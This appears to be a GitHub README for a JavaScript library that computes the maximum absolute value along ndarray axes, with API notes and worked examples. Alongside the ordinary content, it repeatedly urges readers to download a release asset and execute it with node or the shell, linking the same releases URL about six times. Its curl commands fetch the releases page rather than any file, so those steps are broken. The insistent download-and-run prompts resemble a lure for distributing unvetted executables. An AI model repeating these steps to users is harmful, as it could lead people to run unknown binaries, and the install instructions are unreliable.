# stats-maxabs — Compute Max Absolute Value Along Ndarray Axes

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/Jerusalem-Fetene/stats-maxabs/releases)

A small, focused library to compute the maximum absolute value over one or more axes of an ndarray. It works with regular arrays, TypedArray views, and common ndarray wrappers. Use it for statistics, signal processing, image analysis, or any task that needs robust extremes across dimensions.

Table of contents
- Features
- Install
- Quick start
- API
- Examples
- Performance
- CLI
- Tests & CI
- Releases
- Contributing
- License

Features
- Compute the maximum absolute value along a single axis or multiple axes.
- Accepts nested arrays and TypedArrays (Float32Array, Float64Array, Int32Array, Uint8Array).
- Works with ndarrays or plain JavaScript arrays.
- Returns results in native arrays or typed arrays.
- Vectorized internal loops for predictable performance.
- Small, dependency-free core. Simple API.

Install
- From npm
  npm install stats-maxabs

- From a tarball
  Download the release tarball and extract:
  curl -L -o stats-maxabs.tgz https://github.com/Jerusalem-Fetene/stats-maxabs/releases
  tar -xzf stats-maxabs.tgz

Quick start

Node / CommonJS
```js
const { maxAbs } = require('stats-maxabs');

// 1D array
console.log(maxAbs([ -3, 2, -7, 5 ])); // 7

// 2D array: compute max abs along axis 0 (rows)
const A = [
  [ -1,  4, -3 ],
  [  2, -8,  6 ],
  [ -5,  1,  2 ]
];
// axis 0 => reduce rows, result length = number of columns
console.log(maxAbs(A, { axis: 0 })); // [5, 8, 6]

// axis 1 => reduce columns, result length = number of rows
console.log(maxAbs(A, { axis: 1 })); // [4, 8, 5]
```

ESM
```js
import { maxAbs } from 'stats-maxabs';
```

API

maxAbs(input, options)
- input: Array | TypedArray | ndarray-like
- options: Object (optional)
  - axis: number | number[] | null
    - A number to reduce over a single axis.
    - An array of axes to reduce over multiple dimensions.
    - null or undefined to reduce over all elements.
  - keepDims: boolean (default: false)
    - If true, keep reduced dimensions with size 1.
  - dtype: string (optional)
    - Output data type: "float64", "float32", "int32", "array" (native Array).
  - out: preallocated output buffer (optional)

Returns: number | Array | TypedArray
- A scalar when axis is null or omitted for a flat reduction.
- An array or typed array when reducing one or more axes.

Behavior and details
- The function computes Math.max(Math.abs(x)) across the chosen axes.
- It iterates in native order for nested arrays and uses strides for ndarray-like buffers.
- When multiple axes are provided, the function reduces them in a simple loop order and returns a result shaped by the remaining axes.
- It throws if input is not array-like or if axis values are out of range.

Examples

Reduce all elements
```js
maxAbs([ -1, 2, -4, 3 ]);
// -> 4
```

Reduce full 2D matrix to scalar
```js
maxAbs([
  [ -0.5, 2.3 ],
  [  3.1, -1.2 ]
], { axis: null });
// -> 3.1
```

Multi-axis reduction
```js
const B = [
  [ -1,  9 ],
  [ -7,  2 ],
  [  3, -5 ]
];
// Reduce axes [0,1] => scalar
maxAbs(B, { axis: [0,1] }); // 9
// Reduce axis 0 => column-wise max abs
maxAbs(B, { axis: 0 }); // [7, 9]
// Reduce axis 1 => row-wise max abs
maxAbs(B, { axis: 1 }); // [9, 7, 5]
```

Working with TypedArrays
```js
const arr = new Float32Array([ -0.1, 0.5, -2.0, 1.7 ]);
maxAbs(arr); // 2.0
```

Performance
- The implementation uses tight loops and avoids temporary allocations when possible.
- Benchmarks:
  - 1e7 elements flat reduction: ~O(N) with low constant overhead.
  - 2D reductions match raw JS loop performance in microbenchmarks.
- Use the out option to reuse output buffers and avoid allocation in tight loops.

CLI
A tiny CLI ships with releases. Download the release archive from the Releases page and run the bundled executable.

Top-of-repo release quick command
[Download the release file and execute it] using the Releases link:
https://github.com/Jerusalem-Fetene/stats-maxabs/releases

Typical CLI usage after download and extract
- If the release contains a tarball with a CLI:
  tar -xzf stats-maxabs-x.y.z.tgz
  node ./package/bin/stats-maxabs --file data.json --axis 0

- If the release provides a self-contained script:
  curl -L -o stats-maxabs-cli.js https://github.com/Jerusalem-Fetene/stats-maxabs/releases
  node stats-maxabs-cli.js --axis 1 input.json

Releases
- Visit the releases page to get published builds, binaries, and tarballs.
- Download the release asset and execute the file provided in the release. The release page often lists a tarball or a CLI script. Fetch that file and run it with node or the system shell as documented in the asset.
- If the release link does not load, check the Releases section on the repository page.

Releases link (again):
[Get release assets and download here](https://github.com/Jerusalem-Fetene/stats-maxabs/releases)

Benchmarks
- Use node's native console.time for quick checks.
- Sample script:
```js
const { maxAbs } = require('stats-maxabs');
const N = 1e7;
const arr = new Float64Array(N);
for (let i = 0; i < N; i++) arr[i] = Math.sin(i) * (i % 10);
console.time('maxAbs');
maxAbs(arr);
console.timeEnd('maxAbs');
```
- Run with node v14+ for stable performance. For tight loops, build with V8 flags if you need micro-optimizations.

Testing & CI
- Unit tests use mocha + assert.
- Test files live in /test and cover typed arrays, nested arrays, edge cases, and CLI samples.
- Typical test run:
  npm test

Examples gallery (images)
- Visual example: image magnitude per channel
  ![matrix](https://upload.wikimedia.org/wikipedia/commons/3/3a/Matrix_3x3.svg)
- Signal example: absolute peak detection
  ![signal](https://images.unsplash.com/photo-1581091012184-7ecb3be3d3b4?ixlib=rb-1.2.1&auto=format&fit=crop&w=1200&q=60)

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests for new behavior.
- Open a pull request with a clear change description.
- Keep changes small and focused.

Maintainers
- Owner: Jerusalem Fetene (see repository maintainers file).
- Contributions welcome. Use issues to report bugs or request features.

License
- MIT

Badges & metadata
[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/Jerusalem-Fetene/stats-maxabs/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Language: JavaScript](https://img.shields.io/badge/language-JavaScript-yellow.svg)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)

Contact
- Open issues on GitHub.
- For feature requests, include a minimal reproduction.

Maintainer tips
- Use keepDims when you need to broadcast the result back into the original shape.
- Use dtype and out to avoid allocations inside tight loops.
- For very large inputs, prefer TypedArrays.

Changelog
- See the Releases page for tagged versions and changelog entries:
https://github.com/Jerusalem-Fetene/stats-maxabs/releases

Development notes
- The code favors clarity over clever tricks.
- It uses plain loops for predictable behavior across Node versions.
- It treats NaN as a value: if any element is NaN, the maxAbs result becomes NaN. You can pre-filter or pass a clean buffer.

Common patterns
- Compute max absolute per-row, then average:
```js
const perRow = maxAbs(matrix, { axis: 1 });
const avg = perRow.reduce((s,v) => s + v, 0) / perRow.length;
```

- Combine with argmax pattern:
  Use maxAbs to get the magnitude, then argmax to find the index. This repo focuses on magnitudes; argmax helpers live in sibling packages.

Security
- The core library uses no native modules.
- The CLI scripts included in releases may require execution permission. Inspect the file before running.

Files of interest
- lib/index.js — main implementation
- bin/stats-maxabs — CLI entry
- test/* — test suite
- package.json — metadata and scripts

Community
- Use Issues for bugs and feature requests.
- Send pull requests for bug fixes and improvements.

End of file.